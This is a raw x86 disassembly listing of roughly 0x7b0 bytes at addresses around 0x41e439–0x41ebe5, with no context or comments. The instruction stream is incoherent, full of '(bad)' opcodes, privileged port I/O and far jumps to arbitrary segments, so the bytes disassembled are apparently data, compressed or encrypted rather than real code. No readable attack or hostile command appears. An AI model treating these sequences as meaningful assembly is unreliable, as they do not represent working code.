  41e439:	jge    0x41e473
  41e43b:	xor    DWORD PTR ds:[eax+0x3],esi
  41e43f:	std    
  41e440:	fld    DWORD PTR [eax]
  41e442:	test   DWORD PTR [ebx*8-0x27747e7c],esi
  41e449:	add    bh,bh
  41e44b:	lods   al,BYTE PTR ds:[esi]
  41e44c:	fadd   QWORD PTR [edi+0x1e62004d]
  41e452:	push   0xff81c6f5
  41e457:	mov    BYTE PTR [esi+edx*4],dl
  41e45a:	mov    BYTE PTR [esi+0x502f44e9],bh
  41e460:	adc    eax,0x4de7ff98
  41e465:	daa    
  41e466:	add    BYTE PTR [eax],al
  41e468:	out    0xc1,al
  41e46a:	jmp    0x41e49f
  41e46c:	out    0x3c,eax
  41e46e:	arpl   WORD PTR [eax+0x37bdf91c],cx
  41e474:	cmp    ah,BYTE PTR [ecx]
  41e476:	imul   edi,esp,0x3d
  41e479:	push   es
  41e47a:	inc    eax
  41e47b:	jae    0x41e3ff
  41e47d:	std    
  41e47e:	pop    eax
  41e47f:	jae    0x41e4e2
  41e481:	les    eax,FWORD PTR [eax]
  41e483:	(bad)  
  41e484:	fdiv   st,st(2)
  41e486:	addr16 int3 
  41e488:	fild   WORD PTR [eax-0x11537701]
  41e48e:	jnp    0x41e4dd
  41e490:	push   edx
  41e491:	rol    DWORD PTR [ecx-0x252e09be],cl
  41e497:	inc    BYTE PTR ds:0xf5ff8aa0
  41e49d:	or     bh,ch
  41e49f:	aaa    
  41e4a0:	fnstcw WORD PTR [eax+eax*1+0xece1b83]
  41e4a7:	mov    DWORD PTR [edi],esp
  41e4a9:	outs   dx,BYTE PTR ds:[esi]
  41e4aa:	jge    0x41e4aa
  41e4ac:	call   0x23c8596d
  41e4b1:	xchg   BYTE PTR [edx+0x42],bh
  41e4b4:	add    dh,cl
  41e4b6:	clc    
  41e4b7:	lds    eax,FWORD PTR [edi]
  41e4b9:	jno    0x41e504
  41e4bb:	and    eax,0xc0a0b24b
  41e4c0:	repz fstp TBYTE PTR [eax+eiz*2-0x3e089e18]
  41e4c8:	jmp    0x41e454
  41e4ca:	fsubr  DWORD PTR [edx+0x2c]
  41e4cd:	xchg   ebp,eax
  41e4ce:	xchg   ebx,eax
  41e4cf:	jmp    0xd1b2:0xd955
  41e4d5:	mov    ch,0xd9
  41e4d7:	scas   al,BYTE PTR es:[edi]
  41e4d8:	cmp    al,0xa3
  41e4da:	in     al,0xe9
  41e4dc:	jle    0x41e502
  41e4de:	mov    ecx,0xa6e043f6
  41e4e3:	mov    ebp,0x621db15
  41e4e8:	mov    DWORD PTR [esi+ecx*1],esp
  41e4eb:	out    dx,eax
  41e4ec:	jmp    0x9d7bc7d
  41e4f1:	(bad)  
  41e4f2:	shr    al,1
  41e4f4:	test   DWORD PTR [ebx+edx*8+0x26],0xe9f5b485
  41e4fc:	add    edx,DWORD PTR [edx-0x27]
  41e4ff:	xchg   esi,eax
  41e500:	fst    DWORD PTR [esi+0x2236ee0b]
  41e506:	jg     0x41e489
  41e508:	pop    ebx
  41e509:	xchg   cl,bl
  41e50b:	jmp    0x54dbc613
  41e510:	rcr    dl,1
  41e512:	sbb    BYTE PTR [esi],ah
  41e514:	aaa    
  41e515:	xor    BYTE PTR [ebp-0x57],bl
  41e518:	test   DWORD PTR [eax],0x819d060
  41e51e:	ja     0x41e543
  41e520:	push   0xffffffec
  41e522:	sub    edi,edx
  41e524:	cmp    eax,0xd210e314
  41e529:	add    al,0x51
  41e52b:	fnstsw ax
  41e52d:	aam    0x79
  41e52f:	or     esp,ebp
  41e531:	mov    ss:0xdb2e7f19,al
  41e537:	xor    BYTE PTR [edx],ah
  41e539:	mov    DWORD PTR [edx+0x747eb20d],ebx
  41e53f:	sbb    eax,0x5e654367
  41e544:	add    BYTE PTR [ecx],ah
  41e546:	pop    edx
  41e547:	pusha  
  41e548:	xor    BYTE PTR [edx+0x6a3a607a],al
  41e54e:	adc    dh,bl
  41e550:	outs   dx,BYTE PTR ds:[esi]
  41e551:	cli    
  41e552:	cmp    al,0x8a
  41e554:	jae    0x41e53c
  41e556:	or     ebx,DWORD PTR [eax*1+0x27ac7ae5]
  41e55d:	ss pop esp
  41e55f:	mov    WORD PTR [edi+0x40],?
  41e562:	ins    DWORD PTR es:[edi],dx
  41e563:	or     ebx,esp
  41e565:	stos   DWORD PTR es:[edi],eax
  41e566:	fcom   QWORD PTR [edx+0x18]
  41e569:	repnz mov ah,0x8
  41e56c:	aam    0x12
  41e56e:	clc    
  41e56f:	(bad)  
  41e570:	inc    al
  41e572:	xor    BYTE PTR [eax+ebx*2],dh
  41e575:	sub    bl,ah
  41e577:	or     cl,BYTE PTR [ecx-0x18]
  41e57a:	cmp    bl,ch
  41e57c:	xchg   DWORD PTR [eax+0x40611d00],ebp
  41e582:	in     eax,0xa4
  41e584:	leave  
  41e585:	shr    BYTE PTR [edx],0xa
  41e588:	popa   
  41e589:	in     al,dx
  41e58a:	push   0xffffffbd
  41e58c:	mov    dh,0x87
  41e58e:	sub    al,0x16
  41e590:	pop    ebx
  41e591:	inc    ebp
  41e592:	ror    DWORD PTR [edi+0x1d600d17],1
  41e598:	jle    0x41e521
  41e59a:	and    al,0x56
  41e59c:	pop    edx
  41e59d:	dec    ebp
  41e59e:	leave  
  41e59f:	fistp  WORD PTR [ecx-0x525293ff]
  41e5a5:	bound  ebp,QWORD PTR [esi+0x31fae1d]
  41e5ab:	pop    ecx
  41e5ac:	daa    
  41e5ad:	in     eax,0x70
  41e5af:	popf   
  41e5b0:	mov    eax,ebp
  41e5b2:	aad    0xf4
  41e5b4:	xchg   edx,eax
  41e5b5:	sti    
  41e5b6:	mov    al,ds:0x3700de1c
  41e5bb:	aas    
  41e5bc:	adc    DWORD PTR [ebx+0x0],0x30
  41e5c0:	scas   eax,DWORD PTR es:[edi]
  41e5c1:	add    eax,DWORD PTR [edx+0x50]
  41e5c4:	sub    edx,DWORD PTR [ecx*4+0x1be8e17d]
  41e5cb:	aam    0xd6
  41e5cd:	add    BYTE PTR [ebx+ecx*2+0x5382fe8a],al
  41e5d4:	or     cl,ch
  41e5d6:	sub    eax,edi
  41e5d8:	mov    BYTE PTR [edi],bl
  41e5da:	or     al,0x8b
  41e5dc:	mov    DWORD PTR [edx],edx
  41e5de:	mov    eax,ebp
  41e5e0:	lea    ebp,[eax-0x40]
  41e5e3:	add    BYTE PTR [ebx-0x5efbbd24],al
  41e5e9:	(bad)  
  41e5eb:	je     0x41e654
  41e5ed:	in     eax,0x50
  41e5ef:	call   DWORD PTR [esi-0x5f]
  41e5f2:	adc    eax,0xbf563b40
  41e5f7:	or     al,0xc0
  41e5f9:	mov    ds:0xdc038d03,eax
  41e5fe:	or     DWORD PTR [esi+0x33],0xffffffaa
  41e602:	pop    ebp
  41e603:	ret    0xdd47
  41e606:	push   edx
  41e607:	mov    ebp,DWORD PTR [edx]
  41e609:	push   cs
  41e60a:	dec    eax
  41e60b:	and    al,0x3
  41e60d:	push   cs
  41e60e:	inc    esi
  41e60f:	or     BYTE PTR [eax-0x4494ec2c],dh
  41e615:	in     al,0x55
  41e617:	lea    ebp,[ebp+0x80f01e1]
  41e61d:	loop   0x41e658
  41e61f:	(bad)  
  41e621:	mov    cs,WORD PTR [ebx-0x73]
  41e624:	dec    edx
  41e625:	fucomp st(0)
  41e627:	dec    eax
  41e628:	repz fild DWORD PTR [eax]
  41e62b:	jmp    0x41e5f6
  41e62d:	mov    al,0x84
  41e630:	or     ecx,DWORD PTR [ecx-0x728200f5]
  41e636:	mov    BYTE PTR [esi+0x62],dl
  41e639:	jp     0x41e617
  41e63b:	rcr    DWORD PTR [edx-0x5],1
  41e63e:	inc    eax
  41e63f:	out    0xfd,eax
  41e641:	push   eax
  41e642:	(bad)  
  41e643:	dec    DWORD PTR ds:0x342f0
  41e649:	(bad)  
  41e64a:	sti    
  41e64b:	shl    DWORD PTR [ebx],cl
  41e64d:	dec    bx
  41e64f:	into   
  41e650:	pop    es
  41e651:	adc    DWORD PTR [eax-0x54a5b18a],ecx
  41e657:	push   ebp
  41e658:	pop    ss
  41e659:	loope  0x41e61c
  41e65b:	add    ebp,eax
  41e65d:	jmp    0xa141e64a
  41e662:	jle    0x41e663
  41e664:	mov    BYTE PTR [ebx],dl
  41e666:	jle    0x41e5ea
  41e668:	shr    edi,1
  41e66a:	jns    0x41e6e8
  41e66c:	ds push 0xfffffff9
  41e66f:	mov    esi,0x2cac490b
  41e674:	dec    edi
  41e675:	pop    edx
  41e676:	je     0x41e696
  41e678:	mov    DWORD PTR [ebx+0x6a3f047e],esp
  41e67e:	stos   DWORD PTR es:[edi],eax
  41e67f:	dec    edi
  41e680:	jo     0x41e6cf
  41e682:	or     al,0x6
  41e684:	inc    edx
  41e685:	(bad)  [eax-0x5]
  41e688:	and    DWORD PTR [edx],0xd
  41e68b:	jp     0x41e6c4
  41e68d:	pusha  
  41e68e:	add    eax,0x81a08afb
  41e693:	jl     0x41e6d3
  41e695:	pop    esi
  41e696:	repz inc esp
  41e698:	shl    cl,0x20
  41e69b:	add    DWORD PTR [eax],eax
  41e69d:	jmp    0x9202e762
  41e6a2:	lock ja 0x41e693
  41e6a5:	loop   0x41e636
  41e6a7:	push   DWORD PTR [ebx+0x5d]
  41e6aa:	xchg   esp,eax
  41e6ab:	aas    
  41e6ac:	out    0x0,al
  41e6ae:	add    eax,0x2fffff82
  41e6b3:	fnstcw WORD PTR [edx]
  41e6b5:	jnp    0x41e700
  41e6b7:	mov    ch,0x1
  41e6b9:	mov    esi,eax
  41e6bb:	adc    ebx,esp
  41e6bd:	jp     0x41e708
  41e6bf:	mov    ch,0xf5
  41e6c1:	jp     0x41e66b
  41e6c3:	sub    BYTE PTR [eax+0x1d],0x62
  41e6c7:	fldcw  WORD PTR [esi+0x6c]
  41e6ca:	mov    edx,0xe043b6f1
  41e6cf:	(bad)  
  41e6d0:	fidivr DWORD PTR [ebp+0x15]
  41e6d3:	fldl2t 
  41e6d5:	add    ebx,ebx
  41e6d7:	cld    
  41e6d8:	add    eax,0x1cce218
  41e6dd:	add    al,0xf6
  41e6df:	push   es
  41e6e0:	stos   BYTE PTR es:[edi],al
  41e6e1:	sub    bl,BYTE PTR [edi+0x6e893d0c]
  41e6e7:	push   cs
  41e6e8:	int    0x80
  41e6ea:	pop    es
  41e6eb:	loope  0x41e753
  41e6ed:	sub    esp,DWORD PTR [edx+0x4]
  41e6f0:	retf   
  41e6f1:	and    BYTE PTR [esi-0x6840ee25],0xd8
  41e6f8:	jmp    0x29964979
  41e6fd:	clc    
  41e6fe:	xchg   esi,eax
  41e6ff:	es mov ch,0xd3
  41e702:	ss in  eax,0xa5
  41e705:	adc    eax,0x4866d9a2
  41e70a:	pop    ecx
  41e70b:	pusha  
  41e70c:	jae    0x41e715
  41e70e:	or     eax,esp
  41e710:	pop    esi
  41e711:	mov    BYTE PTR [eax],0x61
  41e714:	bound  ebp,QWORD PTR [esi-0x19276280]
  41e71a:	push   esi
  41e71b:	std    
  41e71c:	push   esp
  41e71d:	sbb    al,0x5
  41e71f:	bound  edx,QWORD PTR [ebp-0x57]
  41e722:	div    DWORD PTR [edx]
  41e724:	(bad)  
  41e725:	out    0x6e,al
  41e727:	lahf   
  41e728:	aad    0xe6
  41e72a:	lds    esp,FWORD PTR [ecx+0x26]
  41e72d:	add    DWORD PTR [esi+esi*4],ebx
  41e730:	lea    edx,ds:0x1196c0d
  41e736:	push   0x25
  41e738:	loop   0x41e73b
  41e73a:	pop    ds
  41e73b:	pop    edx
  41e73c:	pusha  
  41e73d:	dec    edx
  41e73e:	in     eax,dx
  41e73f:	cmp    cl,bl
  41e741:	ret    0x5ee5
  41e744:	fsincos 
  41e746:	das    
  41e747:	pop    edx
  41e748:	pusha  
  41e749:	dec    edx
  41e74a:	in     eax,0x28
  41e74c:	fld    st(2)
  41e74e:	in     eax,dx
  41e74f:	data16 fsincos 
  41e752:	daa    
  41e753:	push   0x49
  41e755:	add    DWORD PTR [edx+0x63],edx
  41e758:	retf   
  41e759:	sar    BYTE PTR [esi+0x2b582cb2],0x79
  41e760:	mov    gs,WORD PTR [ecx-0x23]
  41e763:	cdq    
  41e764:	push   es
  41e765:	sbb    ch,BYTE PTR [ebp-0x5a327e9f]
  41e76b:	arpl   cx,bx
  41e76d:	test   DWORD PTR [eax],esp
  41e76f:	push   ebp
  41e770:	sar    BYTE PTR [edi+0x33],1
  41e773:	arpl   WORD PTR [edi],cx
  41e775:	fiadd  DWORD PTR ss:[eax]
  41e778:	mov    eax,ds:0xc61d4557
  41e77d:	sbb    esp,ebp
  41e77f:	shl    BYTE PTR [ebx-0x7a96d9ed],cl
  41e785:	loope  0x41e787
  41e787:	jl     0x41e7d3
  41e789:	pop    ecx
  41e78a:	jl     0x41e77d
  41e78c:	pop    esi
  41e78d:	fnstenv [ebp-0x19]
  41e790:	loopne 0x41e7df
  41e792:	(bad)  
  41e793:	mov    cl,0xa3
  41e795:	fst    QWORD PTR [ecx+ebp*4-0x2102dd1d]
  41e79c:	stos   DWORD PTR es:[edi],eax
  41e79d:	fiadd  WORD PTR [eax-0x3e]
  41e7a0:	stos   DWORD PTR es:[edi],eax
  41e7a1:	leave  
  41e7a2:	shr    BYTE PTR [ecx],0xa3
  41e7a5:	popa   
  41e7a6:	add    BYTE PTR gs:[ebx],dl
  41e7a9:	pop    eax
  41e7aa:	inc    esi
  41e7ab:	cld    
  41e7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ad:	retf   0xe8c0
  41e7b0:	or     BYTE PTR [ecx-0x55f7ffff],ah
  41e7b6:	dec    edx
  41e7b7:	push   ebx
  41e7b8:	mov    ss,WORD PTR [eax]
  41e7ba:	rcl    DWORD PTR [esi-0x74],cl
  41e7bd:	adc    dl,BYTE PTR [eax+0x24]
  41e7c0:	mov    edi,0x4f74d856
  41e7c5:	adc    ecx,DWORD PTR [ecx]
  41e7c7:	test   dl,dh
  41e7c9:	nop
  41e7ca:	ins    DWORD PTR es:[edi],dx
  41e7cb:	xor    edi,ebx
  41e7cd:	adc    DWORD PTR [eax+0x24],eax
  41e7d0:	mov    ebx,0x8e2df259
  41e7d5:	xchg   edx,eax
  41e7d6:	imul   eax,DWORD PTR [edx],0x244012a3
  41e7dc:	add    BYTE PTR [ebx+0x127fff30],cl
  41e7e2:	lock outs dx,DWORD PTR ds:[esi]
  41e7e4:	add    eax,ecx
  41e7e6:	lmsw   WORD PTR [ebx]
  41e7e9:	push   ss
  41e7ea:	enter  0x3cc3,0x6b
  41e7ee:	jge    0x41e816
  41e7f0:	cmp    al,0x52
  41e7f2:	jle    0x41e812
  41e7f4:	pextrw edx,(bad),0xc5
  41e7f6:	adc    eax,0x92f1006a
  41e7fb:	sub    al,0x2b
  41e7fe:	pusha  
  41e7ff:	dec    edx
  41e800:	push   ebp
  41e801:	rol    BYTE PTR ds:0x8663fa89,0x40
  41e808:	add    bh,BYTE PTR [ebx]
  41e80a:	(bad)  
  41e80c:	adc    esp,DWORD PTR [ecx-0x66]
  41e80f:	mov    dh,ch
  41e811:	sbb    edx,0xc8c7cf89
  41e817:	ja     0x41e7f0
  41e819:	nop
  41e81a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e81b:	pop    ds
  41e81c:	adc    al,0x7f
  41e81e:	sbb    BYTE PTR [ecx+0x14de6244],cl
  41e824:	je     0x41e887
  41e826:	push   DWORD PTR [edi]
  41e828:	inc    ch
  41e82a:	xor    bl,0x4
  41e82d:	in     eax,dx
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	or     dh,0x62
  41e832:	dec    ebx
  41e833:	inc    esi
  41e834:	xchg   BYTE PTR [eax-0x46fc4607],cl
  41e83a:	mov    BYTE PTR [eax-0x1e009ddf],al
  41e840:	add    eax,DWORD PTR [eax]
  41e842:	(bad)  
  41e843:	fdivr  st,st(4)
  41e845:	push   edi
  41e846:	adc    eax,0xb58cbbc
  41e84b:	mov    ecx,0x38d95041
  41e850:	add    dh,0x16
  41e853:	mov    dh,0x76
  41e855:	(bad)  
  41e856:	loope  0x41e89a
  41e858:	repz inc ebp
  41e85a:	xor    al,0xef
  41e85c:	jb     0x41e8b2
  41e85e:	fldcw  WORD PTR [esp+ebp*1]
  41e861:	sub    esi,edi
  41e863:	jl     0x41e83e
  41e865:	add    DWORD PTR ds:0x393c1317,edx
  41e86b:	dec    ebp
  41e86c:	adc    ecx,ebp
  41e86e:	push   ebp
  41e86f:	mov    fs,WORD PTR [esi]
  41e871:	jge    0x41e8e3
  41e873:	xchg   edi,eax
  41e874:	jne    0x41e87f
  41e876:	gs cld 
  41e878:	aas    
  41e879:	and    BYTE PTR [edx+edx*8],0x0
  41e87d:	lock mov ds:0x723bff08,eax
  41e883:	gs pop ecx
  41e885:	and    DWORD PTR [edx],0x66
  41e888:	add    BYTE PTR [ecx-0x32877ee3],al
  41e88e:	(bad)  
  41e890:	je     0x41e868
  41e892:	loop   0x41e873
  41e894:	add    DWORD PTR ds:0xc473919f,ecx
  41e89a:	lods   eax,DWORD PTR ds:[esi]
  41e89b:	fnstenv [eax+0x37]
  41e89e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e89f:	xor    BYTE PTR [edi+0x3fd94287],ah
  41e8a5:	cld    
  41e8a6:	add    BYTE PTR [ebp+0x1037a730],cl
  41e8ac:	(bad)  
  41e8ad:	hlt    
  41e8ae:	mov    ebx,0xc5ea1570
  41e8b3:	adc    al,0x21
  41e8b5:	cmp    eax,0xe85ed5c0
  41e8ba:	inc    esp
  41e8bb:	(bad)
  41e8be:	add    al,0xe3
  41e8c0:	cdq    
  41e8c1:	in     eax,0xdc
  41e8c3:	std    
  41e8c4:	cmc    
  41e8c5:	pusha  
  41e8c6:	add    eax,DWORD PTR [esi-0x28]
  41e8c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8ca:	jge    0x41e878
  41e8cc:	sbb    DWORD PTR [ecx+0x6d],ebp
  41e8cf:	popa   
  41e8d0:	or     al,0x26
  41e8d2:	add    al,0x1e
  41e8d4:	js     0x41e936
  41e8d6:	adc    esi,ebp
  41e8d8:	add    al,0x26
  41e8da:	add    al,0xa3
  41e8dc:	and    ch,BYTE PTR [edi+0x31]
  41e8df:	out    dx,al
  41e8e0:	add    al,0xa6
  41e8e2:	add    edi,ebp
  41e8e4:	mov    bl,cl
  41e8e6:	add    eax,0x77dad962
  41e8eb:	mov    bl,0xd8
  41e8ed:	jmp    0x96c51bf5
  41e8f2:	jle    0x41e92b
  41e8f4:	dec    edi
  41e8f5:	xor    ch,BYTE PTR [ebx+0x56]
  41e8f8:	or     ebx,DWORD PTR [edi-0x8]
  41e8fb:	lock sbb eax,0xc845bf9d
  41e901:	in     eax,dx
  41e902:	nop
  41e903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e904:	add    al,0xae
  41e906:	add    eax,DWORD PTR [ebx+0xf7d69e]
  41e90c:	shl    BYTE PTR [ecx],1
  41e90e:	jge    0x41e8cf
  41e910:	and    eax,0x3d872860
  41e915:	fld    DWORD PTR [eax]
  41e917:	sbb    BYTE PTR [edi+0x5e640cc9],dh
  41e91d:	repz inc esp
  41e91f:	jmp    0x5dd7c670
  41e924:	or     eax,0x772b0117
  41e929:	ficom  WORD PTR [ebp+0x116f325]
  41e92f:	push   0xe9007977
  41e934:	popa   
  41e935:	or     eax,0xfd4768c5
  41e93a:	(bad)  
  41e93b:	call   0x3e77f7a1
  41e940:	dec    ebx
  41e941:	into   
  41e942:	xchg   ebp,eax
  41e943:	xor    DWORD PTR [ebx-0x479dfeea],esi
  41e949:	leave  
  41e94a:	dec    ebx
  41e94b:	in     eax,0x84
  41e94d:	mov    al,ds:0x4b24f62f
  41e952:	jg     0x41e8dd
  41e954:	call   0x5795:0x62e9
  41e95a:	sbb    BYTE PTR [edi],al
  41e95c:	mov    ds:0x756e2e8a,al
  41e961:	mov    ?,ebx
  41e963:	pop    esi
  41e964:	xor    al,0x4a
  41e966:	mov    esi,ebp
  41e968:	fcom   QWORD PTR [ebp-0x2a0797fc]
  41e96e:	jnp    0x41e91d
  41e970:	add    BYTE PTR [ecx+0xd],ah
  41e973:	aad    0x9e
  41e975:	(bad)  
  41e977:	dec    eax
  41e978:	mov    esp,0xdc2e8a15
  41e97d:	dec    ebp
  41e97e:	or     eax,0xa07ce945
  41e983:	das    
  41e984:	in     al,dx
  41e985:	cmp    eax,0x24e9450d
  41e98a:	popa   
  41e98b:	shr    DWORD PTR [edx-0x3f],0x8b
  41e98f:	rol    BYTE PTR [eax],1
  41e991:	push   edx
  41e992:	ret    
  41e993:	or     al,0x85
  41e995:	add    edi,DWORD PTR [eax+0x3f]
  41e998:	add    al,bl
  41e99a:	nop
  41e99b:	jae    0x41ea18
  41e99d:	(bad)  
  41e99e:	aad    0x83
  41e9a0:	or     eax,0x3f80f7
  41e9a5:	jo     0x41e938
  41e9a7:	scas   al,BYTE PTR es:[edi]
  41e9a8:	dec    eax
  41e9a9:	xchg   esi,eax
  41e9aa:	cdq    
  41e9ab:	sti    
  41e9ac:	mov    bh,BYTE PTR [edx-0x17f41beb]
  41e9b2:	int    0x88
  41e9b4:	shl    DWORD PTR [esi+0x62],0x53
  41e9b8:	cmp    cl,BYTE PTR [esi+edx*1]
  41e9bb:	fadd   QWORD PTR [edi]
  41e9bd:	enter  0x88cd,0xc1
  41e9c1:	xchg   esi,eax
  41e9c2:	add    ebp,ebx
  41e9c4:	(bad)  
  41e9c5:	fcom   QWORD PTR ds:0xcd980fdc
  41e9cb:	inc    ebp
  41e9cc:	mov    edi,edx
  41e9ce:	adc    eax,0xba3212e4
  41e9d3:	xchg   esp,eax
  41e9d4:	je     0x41e9d6
  41e9d6:	inc    edi
  41e9d7:	aad    0x31
  41e9d9:	shr    DWORD PTR [ebp+0x14],0x4f
  41e9dd:	mov    ecx,DWORD PTR [edi]
  41e9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9e0:	dec    edx
  41e9e1:	push   0x3f7a6b
  41e9e6:	sbb    al,0xda
  41e9e8:	cmp    BYTE PTR [edx],dl
  41e9ea:	retf   
  41e9eb:	aad    0x87
  41e9ed:	inc    ebp
  41e9ee:	adc    esp,DWORD PTR [ebp-0x1944ea04]
  41e9f4:	inc    eax
  41e9f5:	add    dh,al
  41e9f7:	sbb    eax,0xd88c0a6f
  41e9fc:	and    BYTE PTR [edx],dl
  41e9fe:	sti    
  41e9ff:	fmul   QWORD PTR [ecx-0x76218f38]
  41ea05:	dec    ebp
  41ea06:	and    DWORD PTR ds:0xef62fea1,0x69
  41ea0d:	scas   eax,DWORD PTR es:[edi]
  41ea0e:	arpl   WORD PTR [ecx+0x5726745],di
  41ea14:	mov    esp,0x8bae1cff
  41ea19:	adc    DWORD PTR [edx+0x67f54472],esp
  41ea1f:	sbb    dh,cl
  41ea21:	inc    ebx
  41ea22:	bound  esi,QWORD PTR [ecx-0x2c]
  41ea25:	push   ebp
  41ea26:	jmp    0xa253a318
  41ea2b:	jb     0x41ea17
  41ea2d:	xor    DWORD PTR [ecx+0x6243f116],ebp
  41ea33:	jecxz  0x41ea9e
  41ea35:	aad    0xd4
  41ea37:	jge    0x41e9d0
  41ea39:	jae    0x41ea3b
  41ea3b:	push   ds
  41ea3c:	jb     0x41ea3c
  41ea3e:	jb     0x41eaa8
  41ea40:	call   0xbf7b:0x3fc5fc86
  41ea47:	cmp    DWORD PTR ss:[edi+0xa],0xffc0e70a
  41ea4f:	bound  edi,QWORD PTR [edi]
  41ea51:	cli    
  41ea52:	stos   DWORD PTR es:[edi],eax
  41ea53:	cs mov dh,0x4
  41ea56:	xchg   BYTE PTR [edi-0x6aaefb4f],dh
  41ea5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea5d:	mov    edi,0xac722211
  41ea62:	das    
  41ea63:	(bad)  
  41ea65:	call   DWORD PTR [eax+0x7d]
  41ea68:	rcl    BYTE PTR [edi+0x72],1
  41ea6b:	je     0x41ea9c
  41ea6d:	imul   ecx,DWORD PTR [eax+0x12684372],0xffbfa422
  41ea77:	call   0x219ab43b
  41ea7c:	push   0xfb5088d0
  41ea81:	data16 cmp BYTE PTR [ebp-0x27],cl
  41ea85:	call   0x8b0e:0xe9eeaff
  41ea8c:	nop
  41ea8d:	stos   DWORD PTR es:[edi],eax
  41ea8e:	out    dx,al
  41ea8f:	popa   
  41ea90:	int3   
  41ea91:	sub    DWORD PTR [ecx+ebx*2+0x71],ebx
  41ea95:	imul   ebp,DWORD PTR [eax+0x1e],0xffffff88
  41ea99:	mov    dh,0x55
  41ea9b:	push   cs
  41ea9c:	(bad)  
  41ea9d:	inc    DWORD PTR fs:[eax]
  41eaa0:	jbe    0x41eaca
  41eaa2:	mov    WORD PTR [eax+esi*4+0x2f],es
  41eaa6:	cmp    edi,DWORD PTR [ebx-0x5]
  41eaa9:	retf   
  41eaaa:	sar    DWORD PTR [ebx-0x4],cl
  41eaad:	pop    ebp
  41eaae:	shl    al,cl
  41eab0:	dec    edx
  41eab1:	sub    al,0xdb
  41eab3:	lods   eax,DWORD PTR ds:[esi]
  41eab4:	mov    DWORD PTR [ebp-0x27215623],edi
  41eaba:	jmp    0xc1d5d5c2
  41eabf:	stos   DWORD PTR es:[edi],eax
  41eac0:	into   
  41eac1:	xchg   DWORD PTR [edx+0x2bb7617c],ebp
  41eac7:	sub    esi,DWORD PTR [edi+0x16cb8e0a]
  41eacd:	daa    
  41eace:	xor    eax,0x66d96542
  41ead3:	pop    eax
  41ead4:	push   ebp
  41ead5:	cs sbb al,0x7b
  41ead8:	mov    WORD PTR [ebx+0x2d],ss
  41eadb:	and    BYTE PTR [esi+0x54],dh
  41eade:	jg     0x41eb5b
  41eae0:	xor    DWORD PTR [ebp+0xcdccec9],edi
  41eae6:	push   cs
  41eae7:	clc    
  41eae8:	test   DWORD PTR [ecx+0x5a],ebp
  41eaeb:	addr16 jbe 0x41eb41
  41eaee:	push   ecx
  41eaef:	pop    esp
  41eaf0:	cmp    DWORD PTR [eax-0x274398b6],ecx
  41eaf6:	call   0xd84f4cfe
  41eafb:	mov    eax,ds:0x9dd00bd
  41eb01:	addr16 inc eax
  41eb03:	jmp    0x255c6f08
  41eb08:	add    DWORD PTR [esi],esp
  41eb0a:	addr16 inc eax
  41eb0c:	jmp    0xae05c1a9
  41eb11:	dec    ebp
  41eb12:	in     eax,dx
  41eb13:	inc    eax
  41eb14:	dec    ecx
  41eb15:	push   ds
  41eb16:	xchg   edx,eax
  41eb18:	lods   eax,DWORD PTR ds:[esi]
  41eb19:	jge    0x41eafc
  41eb1b:	dec    eax
  41eb1c:	dec    ecx
  41eb1d:	push   ds
  41eb1e:	xchg   DWORD PTR [esi-0x46],ecx
  41eb21:	mov    bl,0xc9
  41eb23:	sar    BYTE PTR [edx+0xd545f98],0x5e
  41eb2a:	pop    esi
  41eb2b:	inc    esp
  41eb2c:	add    eax,0xe6fb5a42
  41eb31:	ins    DWORD PTR es:[edi],dx
  41eb32:	mov    esi,0x5061e901
  41eb37:	retf   0x466a
  41eb3a:	(bad)  
  41eb3b:	mov    DWORD PTR ds:0xb17fed82,ebp
  41eb41:	arpl   WORD PTR [edx],cx
  41eb43:	cmp    eax,ecx
  41eb45:	push   ss
  41eb46:	test   bl,bh
  41eb48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb49:	fiadd  WORD PTR [esi+0xd61e900]
  41eb4f:	lfence 
  41eb52:	mov    edx,0xc6fe2118
  41eb57:	add    BYTE PTR [esi+0x291cbadd],ch
  41eb5d:	mov    esi,0x718200c6
  41eb62:	pushf  
  41eb63:	inc    esp
  41eb64:	lds    ebx,FWORD PTR [ecx+0x19]
  41eb67:	mov    eax,ds:0x9c6100a9
  41eb6c:	inc    esp
  41eb6d:	add    eax,0xa9a1116a
  41eb72:	popa   
  41eb73:	push   eax
  41eb74:	dec    esp
  41eb75:	add    eax,0x545052
  41eb7a:	outs   dx,DWORD PTR ds:[esi]
  41eb7b:	in     eax,0x31
  41eb7d:	not    dl
  41eb7f:	jbe    0x41eba0
  41eb81:	and    al,0xa0
  41eb83:	xchg   BYTE PTR [eax+0x7fb95f74],cl
  41eb89:	leave  
  41eb8a:	fucomip st,st(5)
  41eb8c:	mov    ebx,eax
  41eb8e:	adc    BYTE PTR [eax],bl
  41eb90:	cmp    eax,0xe820743a
  41eb96:	sar    esp,0xfc
  41eb99:	jmp    DWORD PTR [edx+0xbfffbdd]
  41eb9f:	mov    ebx,0x893a3bbb
  41eba4:	adc    BYTE PTR [edx+0x1b],ch
  41eba7:	xchg   edx,eax
  41eba8:	mov    bl,dl
  41ebaa:	lods   eax,DWORD PTR ds:[esi]
  41ebab:	add    al,BYTE PTR [eax+0x5d]
  41ebae:	or     eax,DWORD PTR [ebx]
  41ebb0:	push   eax
  41ebb1:	and    al,0x63
  41ebb3:	and    dl,BYTE PTR [edx-0x76260500]
  41ebb9:	inc    esp
  41ebba:	outs   dx,DWORD PTR ds:[esi]
  41ebbb:	in     eax,dx
  41ebbc:	test   al,0x20
  41ebbe:	(bad)  
  41ebbf:	int    0x7f
  41ebc1:	fisttp DWORD PTR [esi-0x6d3f7b27]
  41ebc7:	in     eax,0xe8
  41ebc9:	push   edi
  41ebca:	add    eax,0x33fcfc
  41ebcf:	stc    
  41ebd0:	mov    ds:0x9cc58fe,al
  41ebd5:	jg     0x41eba9
  41ebd7:	dec    esi
  41ebd8:	aad    0x66
  41ebda:	or     DWORD PTR [ecx-0x38],eax
  41ebdd:	ret    
  41ebde:	call   0x3eeb0e
  41ebe3:	test   BYTE PTR [ebx],dh
  41ebe5:	mov    ebx,0x2c1cf866
